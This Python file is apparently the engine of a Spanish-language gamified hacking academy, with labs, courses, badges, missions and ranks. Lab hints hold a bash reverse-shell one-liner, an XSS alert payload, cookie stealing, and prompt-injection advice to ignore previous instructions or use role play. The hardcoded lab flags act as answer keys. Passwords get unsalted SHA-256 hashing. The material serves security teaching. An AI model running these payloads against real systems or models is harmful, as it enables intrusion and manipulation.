"""Hacking Academy LATAM - Motor completo de la plataforma"""
import uuid
import time
import hashlib
from typing import Dict, List, Optional
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime, timedelta

# ==================== MODELOS ====================

class Difficulty(Enum):
    BEGINNER = "principiante"
    INTERMEDIATE = "intermedio"
    ADVANCED = "avanzado"
    EXPERT = "experto"

class MissionType(Enum):
    DAILY = "diaria"
    WEEKLY = "semanal"
    SPECIAL = "especial"

@dataclass
class Lab:
    id: str
    title: str
    description: str
    difficulty: Difficulty
    category: str
    xp_reward: int
    badge_id: Optional[str] = None
    flag: str = ""
    hints: List[str] = field(default_factory=list)
    template: str = ""

@dataclass
class Course:
    id: str
    title: str
    description: str
    difficulty: Difficulty
    duration_hours: int
    modules: List[Dict]
    price: float
    icon: str = "📚"
    lab_ids: List[str] = field(default_factory=list)

@dataclass
class Badge:
    id: str
    name: str
    description: str
    icon: str
    rarity: str  # common, rare, epic, legendary
    xp_bonus: int

@dataclass
class Mission:
    id: str
    title: str
    description: str
    mission_type: MissionType
    xp_reward: int
    badge_id: Optional[str] = None
    category: str = ""
    difficulty: Difficulty = Difficulty.BEGINNER

@dataclass
class User:
    user_id: str
    username: str
    email: str
    password_hash: str
    level: int = 1
    xp: int = 0
    xp_to_next: int = 100
    rank_title: str = "Novato"
    country: str = ""
    avatar: str = "😎"
    joined: str = ""
    courses_enrolled: List[str] = field(default_factory=list)
    courses_completed: List[str] = field(default_factory=list)
    badges: List[str] = field(default_factory=list)
    missions_completed: List[str] = field(default_factory=list)
    labs_completed: List[str] = field(default_factory=list)
    streak: int = 0
    last_login: str = ""
    total_time_minutes: int = 0

# ==================== BADGES ====================

ALL_BADGES = [
    Badge("B001", "Primer Login", "Inicia sesión por primera vez", "🌟", "common", 10),
    Badge("B002", "Explorador", "Completó su primer lab", "🔍", "common", 25),
    Badge("B003", "Curioso", "Inscribió en 3 cursos", "📖", "common", 30),
    Badge("B004", "SQL Hunter", "Completó lab de SQL Injection", "💉", "rare", 50),
    Badge("B005", "XSS Master", "Completó lab de XSS", "🌐", "rare", 50),
    Badge("B006", "Red Team Init", "Completó primer lab de Red Team", "🏴‍☠️", "rare", 75),
    Badge("B007", "Bug Finder", "Encontró 5 vulnerabilidades", "🐛", "rare", 60),
    Badge("B008", "Streak Warrior", "7 días consecutivos activos", "🔥", "epic", 100),
    Badge("B009", "Code Breaker", "Completó labs de criptografía", "🔐", "epic", 80),
    Badge("B010", "Network Ninja", "Completó labs de redes", "🕸️", "epic", 80),
    Badge("B011", "AI Hacker", "Completó lab de AI Security", "🤖", "epic", 100),
    Badge("B012", "Shadow Master", "Completó todos los labs avanzados", "👤", "legendary", 200),
    Badge("B013", "Legend", "Alcanzó nivel 50", "👑", "legendary", 500),
    Badge("B014", "Speed Demon", "Completó un lab en menos de 2 min", "⚡", "rare", 75),
    Badge("B015", "Community Hero", "50+ labs completados", "🦸", "legendary", 300),
    Badge("B016", "Full Stack Hacker", "Completó todas las categorías", "🎯", "legendary", 250),
    Badge("B017", "0-Day Hunter", "Encontró lab oculto", "💎", "legendary", 150),
    Badge("B018", "Weekend Warrior", "Completó 10 labs en un día", "⚔️", "epic", 120),
]

# ==================== LABS ====================

ALL_LABS = [
    Lab("L001", "SQL Injection Básico", "Inyecta SQL para extraer datos de una base de datos vulnerable", Difficulty.BEGINNER, "web", 100, "B004",
        flag="flag{sql_1nj3ct10n_m4st3r}", hints=["Intenta agregar comillas simples", "La función UNION puede ser útil", "No olvides cerrar el comentario SQL"]),
    Lab("L002", "XSS Reflejado", "Inyecta JavaScript en una página vulnerable a XSS reflejado", Difficulty.BEGINNER, "web", 100, "B005",
        flag="flag{xss_r3fl3ct3d_pr0}", hints=["Intenta inyectar <script>alert(1)</script>", "El input no está sanitizado", "Prueba con event handlers"]),
    Lab("L003", "Enumeración de Directorios", "Descubre directorios ocultos en un servidor web", Difficulty.BEGINNER, "recon", 75,
        flag="flag{d1r3ct0ry_3num}", hints=["Usa wordlists como common.txt", "feroxbuster o gobuster son útiles", "No olvides incluir extensiones"]),
    Lab("L004", "Decodificación Base64", "Decodifica mensajes cifrados en Base64", Difficulty.BEGINNER, "crypto", 50,
        flag="flag{b4s364_d3c0d3r}", hints=["Base64 no es cifrado, es encoding", "echo 'texto' | base64 -d", "Intenta con cyberchef"]),
    Lab("L005", "Reverse Shell Básico", "Establece una reverse shell en un servidor vulnerable", Difficulty.INTERMEDIATE, "exploitation", 150,
        flag="flag{rv3rs3_sh3ll_pr0}", hints=["Netcat es tu amigo", "bash -i >& /dev/tcp/IP/PORT 0>&1", "Verifica que el puerto esté abierto"]),
    Lab("L006", "Privilege Escalation Linux", "Escalada de privilegios en un sistema Linux", Difficulty.INTERMEDIATE, "privesc", 200, "B006",
        flag="flag{pr1v3sc_l1nux}", hints=["Busca SUID binaries", "sudo -l puede revelar permisos", "LinPEAS es una buena herramienta"]),
    Lab("L007", "Buffer Overflow", "Explota un buffer overflow para obtener código arbitrario", Difficulty.ADVANCED, "exploitation", 250,
        flag="flag{buff3r_0v3rfl0w}", hints=["El registro EIP se sobreescribe", "Usa pattern_create y pattern_offset", "shellcode de 23 bytes"]),
    Lab("L008", "CSRF Attack", "Realiza un ataque Cross-Site Request Forgery", Difficulty.INTERMEDIATE, "web", 150,
        flag="flag{csrf_4tt4ck}", hints=["Crea un formulario HTML malicioso", "El token CSRF puede ser predecible", "El método POST puede ser vulnerable"]),
    Lab("L009", "Password Cracking", "Crackea hashes de contraseñas usando fuerza bruta y diccionario", Difficulty.BEGINNER, "crypto", 100,
        flag="flag{p4ssw0rd_cr4ck}", hints=["john the ripper o hashcat", "Prueba con rockyou.txt", "Identifica el tipo de hash primero"]),
    Lab("L010", "Network Sniffing", "Captura y analiza tráfico de red para encontrar credenciales", Difficulty.INTERMEDIATE, "recon", 150,
        flag="flag{sn1ff3r_pr0}", hints=["Wireshark es la herramienta ideal", "Filtra por protocolo HTTP", "Busca tráfico sin cifrar"]),
    Lab("L011", "SQL Injection Avanzado (Blind)", "Extrae datos de una base de datos con SQL Injection a ciegas", Difficulty.ADVANCED, "web", 250,
        flag="flag{bl1nd_sql_3xtr4ct}", hints=["Boolean-based blind injection", "Time-based injection también funciona", "Usa sqlmap con --dump"]),
    Lab("L012", "Prompt Injection AI", "Inyecta prompts para manipular modelos de IA", Difficulty.ADVANCED, "ai", 300, "B011",
        flag="flag{pr0mpt_1nj3ct10n}", hints=["Intenta ignorar instrucciones previas", "Usa delimiters como ---", "Role playing funciona a veces"]),
    Lab("L013", "Web App Recon", "Realiza reconocimiento completo de una aplicación web", Difficulty.BEGINNER, "recon", 75,
        flag="flag{w3b_r3c0n_m4st3r}", hints=["Empezar con whatweb y wappalyzer", "robots.txt y sitemap.xml son útiles", "Subdomain enumeration"]),
    Lab("L014", "XSS Persistente", "Inyecta XSS que se guarde en la base de datos", Difficulty.INTERMEDIATE, "web", 200,
        flag="flag{xss_p3rs1st3nt}", hints=["El payload se almacena en la DB", "Prueba en campos de perfil", "Cookie stealing"]),
    Lab("L015", "IDOR Vulnerability", "Explota una vulnerabilidad de Insecure Direct Object Reference", Difficulty.INTERMEDIATE, "web", 150,
        flag="flag{1d0r_f0und}", hints=["Cambia el ID en la URL", "Prueba con IDs secuenciales", "API endpoints pueden ser vulnerables"]),
    Lab("L016", "Reverse Engineering APK", "Analiza una aplicación Android para encontrar vulnerabilidades", Difficulty.ADVANCED, "mobile", 250,
        flag="flag{r3v3rs3_4pk}", hints=["jadx para decompilar", "Busca strings hardcoded", "Certificate pinning bypass"]),
    Lab("L017", "Cloud Misconfiguration", "Encuentra configuraciones incorrectas en AWS", Difficulty.EXPERT, "cloud", 350,
        flag="flag{cl0ud_m1sc0nf1g}", hints=["S3 buckets públicos", "IAM roles overly permissive", "Security groups abiertos"]),
    Lab("L018", "Data Poisoning AI", "Envenena datos de entrenamiento de un modelo ML", Difficulty.EXPERT, "ai", 400,
        flag="flag{d4ta_p01s0n1ng}", hints=["Modifica ejemplos de entrenamiento", "Backdoor attacks en modelos", "Label flipping"]),
]

# ==================== COURSES ====================

ALL_COURSES = [
    Course("C001", "Fundamentos de Ciberseguridad", "Aprende los conceptos esenciales de seguridad informática desde cero",
           Difficulty.BEGINNER, 40, [
        {"id": "M001", "title": "Introducción a la Seguridad", "duration": "2h", "xp": 50},
        {"id": "M002", "title": "Redes y Protocolos", "duration": "4h", "xp": 80},
        {"id": "M003", "title": "Criptografía Básica", "duration": "3h", "xp": 60},
        {"id": "M004", "title": "Sistemas Operativos y Seguridad", "duration": "4h", "xp": 70},
        {"id": "M005", "title": "Passwords y Autenticación", "duration": "3h", "xp": 60},
        {"id": "M006", "title": "Seguridad de Redes", "duration": "4h", "xp": 80},
        {"id": "M007", "title": "Firewalls e IDS", "duration": "3h", "xp": 60},
        {"id": "M008", "title": "Seguridad de Aplicaciones", "duration": "4h", "xp": 80},
        {"id": "M009", "title": "Criptografía Avanzada", "duration": "4h", "xp": 100},
        {"id": "M010", "title": "Examen Final", "duration": "2h", "xp": 150},
    ], 0, "🌱", ["L004", "L009", "L013"]),

    Course("C002", "Web Hacking Profesional", "Domina OWASP Top 10 y técnicas de pentesting web",
           Difficulty.BEGINNER, 60, [
        {"id": "M011", "title": "OWASP Top 10 Explicado", "duration": "4h", "xp": 80},
        {"id": "M012", "title": "SQL Injection Desde Cero", "duration": "5h", "xp": 120},
        {"id": "M013", "title": "Cross-Site Scripting (XSS)", "duration": "4h", "xp": 100},
        {"id": "M014", "title": "CSRF y Clickjacking", "duration": "3h", "xp": 80},
        {"id": "M015", "title": "Autenticación y Sesiones", "duration": "4h", "xp": 90},
        {"id": "M016", "title": "IDOR y Authorization Bypass", "duration": "4h", "xp": 100},
        {"id": "M017", "title": "File Upload y RCE", "duration": "4h", "xp": 110},
        {"id": "M018", "title": "SSRF y XXE", "duration": "4h", "xp": 100},
        {"id": "M019", "title": "SQLi Avanzado y Blind", "duration": "5h", "xp": 130},
        {"id": "M020", "title": "Proyecto Final: Pentest Completo", "duration": "6h", "xp": 200},
    ], 49.99, "🌐", ["L001", "L002", "L008", "L011", "L014", "L015"]),

    Course("C003", "Mobile & Network Hacking", "Pentesting en aplicaciones móviles y redes corporativas",
           Difficulty.INTERMEDIATE, 50, [
        {"id": "M021", "title": "Android Security Fundamentals", "duration": "4h", "xp": 100},
        {"id": "M022", "title": "APK Reverse Engineering", "duration": "5h", "xp": 120},
        {"id": "M023", "title": "iOS Security y Jailbreak", "duration": "4h", "xp": 100},
        {"id": "M024", "title": "API Testing para Móviles", "duration": "4h", "xp": 90},
        {"id": "M025", "title": "Network Pentesting", "duration": "5h", "xp": 120},
        {"id": "M026", "title": "WiFi Hacking Ético", "duration": "4h", "xp": 110},
        {"id": "M027", "title": "Active Directory Attacks", "duration": "5h", "xp": 130},
        {"id": "M028", "title": "Proyecto Final: Mobile Pentest", "duration": "6h", "xp": 200},
    ], 79.99, "📱", ["L005", "L010", "L016"]),

    Course("C004", "Red Team Operations", "Simulación de ataques avanzados y operaciones ofensivas",
           Difficulty.ADVANCED, 70, [
        {"id": "M029", "title": "Red Team Methodology", "duration": "4h", "xp": 120},
        {"id": "M030", "title": "Recon y OSINT Avanzado", "duration": "5h", "xp": 130},
        {"id": "M031", "title": "Initial Access Techniques", "duration": "6h", "xp": 150},
        {"id": "M032", "title": "Post-Exploitation", "duration": "5h", "xp": 140},
        {"id": "M033", "title": "Lateral Movement", "duration": "5h", "xp": 140},
        {"id": "M034", "title": "Persistence y Evasion", "duration": "5h", "xp": 150},
        {"id": "M035", "title": "C2 Frameworks", "duration": "5h", "xp": 140},
        {"id": "M036", "title": "Exfiltration Techniques", "duration": "4h", "xp": 120},
        {"id": "M037", "title": "Reporting y Remediation", "duration": "4h", "xp": 100},
        {"id": "M038", "title": "Proyecto Final: Full Red Team Engagement", "duration": "8h", "xp": 300},
    ], 149.99, "🏴‍☠️", ["L006", "L007", "L012"]),

    Course("C005", "AI Security Specialist", "Protege y ataca sistemas de inteligencia artificial",
           Difficulty.EXPERT, 45, [
        {"id": "M039", "title": "AI/ML Security Fundamentals", "duration": "4h", "xp": 120},
        {"id": "M040", "title": "Prompt Injection Attacks", "duration": "5h", "xp": 150},
        {"id": "M041", "title": "LLM Jailbreaking", "duration": "4h", "xp": 140},
        {"id": "M042", "title": "Data Poisoning", "duration": "5h", "xp": 150},
        {"id": "M043", "title": "Model Stealing", "duration": "4h", "xp": 130},
        {"id": "M044", "title": "Adversarial Examples", "duration": "4h", "xp": 140},
        {"id": "M045", "title": "AI Red Teaming Lab", "duration": "5h", "xp": 160},
        {"id": "M046", "title": "Proyecto Final: AI Pentest Report", "duration": "6h", "xp": 250},
    ], 199.99, "🤖", ["L012", "L018"]),

    Course("C006", "Cloud & DevSecOps Security", "Seguridad en infraestructura cloud y pipelines CI/CD",
           Difficulty.EXPERT, 55, [
        {"id": "M047", "title": "Cloud Security Fundamentals", "duration": "4h", "xp": 120},
        {"id": "M048", "title": "AWS Security Deep Dive", "duration": "5h", "xp": 140},
        {"id": "M049", "title": "Azure & GCP Security", "duration": "5h", "xp": 140},
        {"id": "M050", "title": "Container Security (Docker/K8s)", "duration": "5h", "xp": 150},
        {"id": "M051", "title": "CI/CD Pipeline Security", "duration": "4h", "xp": 120},
        {"id": "M052", "title": "Infrastructure as Code Security", "duration": "4h", "xp": 120},
        {"id": "M053", "title": "Cloud Forensics", "duration": "4h", "xp": 130},
        {"id": "M054", "title": "Proyecto Final: Cloud Pentest", "duration": "6h", "xp": 250},
    ], 199.99, "☁️", ["L017"]),
]

# ==================== MISSIONS ====================

def generate_daily_missions():
    return [
        Mission("D001", "Desafío SQL Daily", "Resuelve un reto de SQL Injection rápido", MissionType.DAILY, 50, category="web", difficulty=Difficulty.BEGINNER),
        Mission("D002", "Recon del Día", "Realiza reconocimiento en un target nuevo", MissionType.DAILY, 40, category="recon"),
        Mission("D003", "Crypto Challenge", "Decodifica un mensaje cifrado", MissionType.DAILY, 30, category="crypto"),
        Mission("D004", "XSS Quick Fire", "Encuentra un XSS reflejado en menos de 5 min", MissionType.DAILY, 60, badge_id="B014", category="web"),
    ]

def generate_weekly_missions():
    return [
        Mission("W001", "Maratón de Labs", "Completa 5 labs esta semana", MissionType.WEEKLY, 200, category="general"),
        Mission("W002", "Web Warrior", "Completa 3 labs de web hacking", MissionType.WEEKLY, 250, category="web"),
        Mission("W003", "Cursal Completo", "Avanza 10 módulos en cualquier curso", MissionType.WEEKLY, 300, category="general"),
        Mission("W004", "Streak Maintainer", "Mantén tu racha de 7 días", MissionType.WEEKLY, 150, badge_id="B008", category="general"),
    ]

# ==================== RANKS ====================

RANKS = [
    (1, "Novato", "🌱"),
    (5, "Aprendiz", "📚"),
    (10, "Script Kiddie", "⚔️"),
    (15, "Hacker", "🔧"),
    (20, "Specialist", "🎯"),
    (25, "Elite Hacker", "💀"),
    (30, "Pro Hacker", "🔥"),
    (35, "Master Hacker", "⚡"),
    (40, "Expert", "🏴‍☠️"),
    (45, "Grandmaster", "👑"),
    (50, "Legend", "🏆"),
]

# ==================== ACADEMY ENGINE ====================

class HackingAcademy:
    def __init__(self):
        self.users: Dict[str, User] = {}
        self.courses = ALL_COURSES
        self.labs = ALL_LABS
        self.badges = ALL_BADGES
        self._init_demo_users()

    def _init_demo_users(self):
        demos = [
            ("cyberwolf_mx", "Cyber Wolf", "🇲🇽", "💀", 42, 89500),
            ("secarg_ar", "SecArg", "🇦🇷", "🔥", 38, 72000),
            ("hacker_co", "HackerCol", "🇨🇴", "🏴‍☠️", 35, 58200),
            ("pentest_br", "PentestBR", "🇧🇷", "🎯", 31, 51000),
            ("vulnhunter_cl", "VulnHunter", "🇨🇱", "🔧", 28, 43800),
            ("zeroday_mx", "ZeroDayMX", "🇲🇽", "⚡", 25, 38500),
            ("redteam_ar", "RedTeamAR", "🇦🇷", "💀", 22, 32000),
            ("exploit_co", "ExploitCO", "🇨🇴", "🔥", 20, 28500),
            ("shellcode_br", "ShellCodeBR", "🇧🇷", "🏴‍☠️", 18, 24000),
            ("payload_cl", "PayloadCL", "🇨🇱", "🎯", 15, 19500),
        ]
        for i, (uname, display, country, avatar, level, xp) in enumerate(demos):
            uid = f"demo_{i}"
            rank_title = "Novato"
            for lvl, title, _ in reversed(RANKS):
                if level >= lvl:
                    rank_title = title
                    break
            self.users[uid] = User(
                user_id=uid, username=uname, email=f"{uname}@demo.com",
                password_hash="", level=level, xp=xp, xp_to_next=(level+1)*100,
                rank_title=rank_title, country=country, avatar=avatar,
                joined="2026-01-01", streak=level // 3,
                labs_completed=[f"L{i:03d}" for i in range(1, min(level, 18)+1)],
                badges=[b.id for b in self.badges[:min(level//5, len(self.badges))]]
            )

    def register(self, username: str, email: str, password: str) -> Dict:
        for u in self.users.values():
            if u.username == username:
                return {"error": "El usuario ya existe"}
            if u.email == email:
                return {"error": "El email ya está registrado"}
        uid = str(uuid.uuid4())[:8]
        pw_hash = hashlib.sha256(password.encode()).hexdigest()
        user = User(
            user_id=uid, username=username, email=email, password_hash=pw_hash,
            joined=datetime.now().isoformat(), last_login=datetime.now().isoformat(),
            badges=["B001"]
        )
        self.users[uid] = user
        return {"success": True, "user_id": uid, "message": "Registro exitoso"}

    def login(self, username: str, password: str) -> Dict:
        pw_hash = hashlib.sha256(password.encode()).hexdigest()
        for u in self.users.values():
            if u.username == username and u.password_hash == pw_hash:
                u.last_login = datetime.now().isoformat()
                return {"success": True, "user": self._user_dict(u)}
        return {"error": "Credenciales inválidas"}

    def _user_dict(self, u: User) -> Dict:
        return {
            "user_id": u.user_id, "username": u.username, "email": u.email,
            "level": u.level, "xp": u.xp, "xp_to_next": u.xp_to_next,
            "rank_title": u.rank_title, "country": u.country, "avatar": u.avatar,
            "joined": u.joined, "streak": u.streak,
            "courses_enrolled": u.courses_enrolled, "courses_completed": u.courses_completed,
            "badges": u.badges, "labs_completed": u.labs_completed,
            "missions_completed": u.missions_completed,
            "total_labs": len(u.labs_completed),
            "total_badges": len(u.badges),
        }

    def get_user(self, user_id: str) -> Optional[Dict]:
        u = self.users.get(user_id)
        return self._user_dict(u) if u else None

    def add_xp(self, user_id: str, amount: int) -> Dict:
        u = self.users.get(user_id)
        if not u:
            return {"error": "Usuario no encontrado"}
        u.xp += amount
        levels_gained = 0
        while u.xp >= u.xp_to_next:
            u.xp -= u.xp_to_next
            u.level += 1
            u.xp_to_next = u.level * 100
            levels_gained += 1
        for lvl, title, _ in reversed(RANKS):
            if u.level >= lvl:
                u.rank_title = title
                break
        return {"xp": u.xp, "level": u.level, "xp_to_next": u.xp_to_next,
                "levels_gained": levels_gained, "rank_title": u.rank_title}

    def complete_lab(self, user_id: str, lab_id: str, flag: str) -> Dict:
        u = self.users.get(user_id)
        if not u:
            return {"error": "Usuario no encontrado"}
        lab = next((l for l in self.labs if l.id == lab_id), None)
        if not lab:
            return {"error": "Lab no encontrado"}
        if lab_id in u.labs_completed:
            return {"error": "Ya completaste este lab", "already_completed": True}
        if flag != lab.flag:
            return {"error": "Flag incorrecta", "correct": False}
        u.labs_completed.append(lab_id)
        xp_result = self.add_xp(user_id, lab.xp_reward)
        badge_msg = ""
        if lab.badge_id and lab.badge_id not in u.badges:
            u.badges.append(lab.badge_id)
            badge = next((b for b in self.badges if b.id == lab.badge_id), None)
            badge_msg = f"¡Badge desbloqueado: {badge.name}!" if badge else ""
        return {"success": True, "xp_earned": lab.xp_reward, "badge": badge_msg,
                "flag_correct": True, **xp_result}

    def get_courses(self, difficulty: str = None) -> List[Dict]:
        courses = self.courses
        if difficulty:
            courses = [c for c in courses if c.difficulty.value == difficulty]
        return [{
            "id": c.id, "title": c.title, "description": c.description,
            "difficulty": c.difficulty.value, "duration": c.duration_hours,
            "modules": c.modules, "price": c.price, "icon": c.icon,
            "total_xp": sum(m["xp"] for m in c.modules),
            "lab_count": len(c.lab_ids),
        } for c in courses]

    def get_course(self, course_id: str) -> Optional[Dict]:
        c = next((c for c in self.courses if c.id == course_id), None)
        if not c:
            return None
        return {
            "id": c.id, "title": c.title, "description": c.description,
            "difficulty": c.difficulty.value, "duration": c.duration_hours,
            "modules": c.modules, "price": c.price, "icon": c.icon,
            "lab_ids": c.lab_ids,
            "labs": [{"id": l.id, "title": l.title, "difficulty": l.difficulty.value,
                      "xp_reward": l.xp_reward, "category": l.category}
                     for l in self.labs if l.id in c.lab_ids],
        }

    def enroll(self, user_id: str, course_id: str) -> Dict:
        u = self.users.get(user_id)
        if not u:
            return {"error": "Usuario no encontrado"}
        if course_id in u.courses_enrolled:
            return {"error": "Ya estás inscrito"}
        u.courses_enrolled.append(course_id)
        if "B003" not in u.badges and len(u.courses_enrolled) >= 3:
            u.badges.append("B003")
        return {"success": True, "message": "Inscripción exitosa"}

    def complete_module(self, user_id: str, course_id: str, module_id: str) -> Dict:
        u = self.users.get(user_id)
        if not u:
            return {"error": "Usuario no encontrado"}
        course = next((c for c in self.courses if c.id == course_id), None)
        if not course:
            return {"error": "Curso no encontrado"}
        module = next((m for m in course.modules if m["id"] == module_id), None)
        if not module:
            return {"error": "Módulo no encontrado"}
        return self.add_xp(user_id, module["xp"])

    def get_labs(self, category: str = None, difficulty: str = None) -> List[Dict]:
        labs = self.labs
        if category:
            labs = [l for l in labs if l.category == category]
        if difficulty:
            labs = [l for l in labs if l.difficulty.value == difficulty]
        return [{
            "id": l.id, "title": l.title, "description": l.description,
            "difficulty": l.difficulty.value, "category": l.category,
            "xp_reward": l.xp_reward, "badge_id": l.badge_id,
            "hints": l.hints,
        } for l in labs]

    def get_leaderboard(self, country: str = None) -> List[Dict]:
        users = list(self.users.values())
        if country:
            users = [u for u in users if u.country == country]
        users.sort(key=lambda u: (u.level, u.xp), reverse=True)
        return [{
            "rank": i+1, "user_id": u.user_id, "username": u.username,
            "level": u.level, "xp": u.xp, "rank_title": u.rank_title,
            "country": u.country, "avatar": u.avatar,
            "labs_completed": len(u.labs_completed),
            "badges": len(u.badges),
        } for i, u in enumerate(users[:50])]

    def get_missions(self) -> Dict:
        return {
            "daily": [{
                "id": m.id, "title": m.title, "description": m.description,
                "xp_reward": m.xp_reward, "category": m.category,
            } for m in generate_daily_missions()],
            "weekly": [{
                "id": m.id, "title": m.title, "description": m.description,
                "xp_reward": m.xp_reward, "category": m.category,
            } for m in generate_weekly_missions()],
        }

    def get_stats(self) -> Dict:
        total_users = len(self.users)
        total_labs = len(self.labs)
        total_courses = len(self.courses)
        total_badges = len(self.badges)
        avg_level = sum(u.level for u in self.users.values()) / max(total_users, 1)
        return {
            "total_users": total_users, "total_labs": total_labs,
            "total_courses": total_courses, "total_badges": total_badges,
            "average_level": round(avg_level, 1),
            "total_xp_awarded": sum(u.xp for u in self.users.values()),
            "countries": list(set(u.country for u in self.users.values() if u.country)),
        }

    def get_badges(self) -> List[Dict]:
        return [{"id": b.id, "name": b.name, "description": b.description,
                 "icon": b.icon, "rarity": b.rarity, "xp_bonus": b.xp_bonus}
                for b in self.badges]

academy = HackingAcademy()
